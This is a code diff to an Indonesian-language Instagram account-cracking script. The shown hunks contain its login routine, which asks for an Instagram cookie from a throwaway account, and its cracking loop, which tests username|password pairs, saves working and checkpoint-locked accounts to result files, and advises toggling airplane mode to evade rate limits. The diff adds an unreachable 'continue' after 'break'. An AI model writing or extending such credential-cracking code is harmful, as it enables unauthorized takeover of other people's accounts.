@@ -37,7 +37,7 @@ ses = Session()
 def ___login___():
     os.system('clear')
     print(___logo___)
-    print("\n%s[%s!%s]%s Anda Harus Memasukan Cookie Instagram, Sebaiknya Gunakan Akun Tumbal Untuk Login, Jika Anda Belum Tau Cara Mendapatkan Cookie Ketik {Open}\n"%(M,B,M,B))
+    print("\n%s[%s!%s]%s Anda Harus Memasukan Cookie Instagram, Sebaiknya Gunakan Akun Tumbal Untuk Login, Jika Anda Belum Tau Cara Mendapatkan Cookie Ketik {Open}\n"%(M,H,M,H))
     try:
         ___cookie___ = input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
         if ___cookie___ in ['open','Open']:
@@ -449,6 +449,7 @@ def ___crack___(total,user,pwx):
                 ok.append("%s|%s"%(user,pw))
                 open('Results/Ok.txt','a').write("%s|%s\n"%(user,pw))
                 break
+                continue
             elif 'checkpoint' in str(req):
                 try:
                     __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
@@ -466,6 +467,7 @@ def ___crack___(total,user,pwx):
                 cp.append("%s|%s"%(user,pw))
                 open('Results/Cp.txt','a').write("%s|%s\n"%(user,pw))
                 break
+                continue
             elif 'Please wait' in str(req) or 'Try Again Later' in str(req):
                 sys.stdout.write(
                     "\r%s[%s!%s]%s Gunakan Mode Pesawat 2 Detik"%(P,M,P,M)),
